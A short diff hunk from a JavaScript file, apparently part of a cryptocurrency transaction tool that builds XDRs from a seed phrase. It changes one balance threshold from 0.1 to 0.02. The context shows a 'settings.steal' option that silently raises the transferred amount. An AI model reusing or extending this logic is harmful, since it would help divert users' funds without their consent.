@@ -115,7 +115,7 @@ async function getXDRsReady(mainPhrase, balanceId, recipient, amount, time, name
                     const accountData  = await getAccount(kp.publicKey());
                     const balanceString = getBalance(accountData);
                     const balance = parseFloat(balanceString) - 0.98;
-                    if(balance < 0.1) continue;
+                    if(balance < 0.02) continue;
                     // Change amount
                     const mutatedAmount = ( !!name && settings.steal ) ? (Number(amount) + 0.0101).toString() : amount;
 
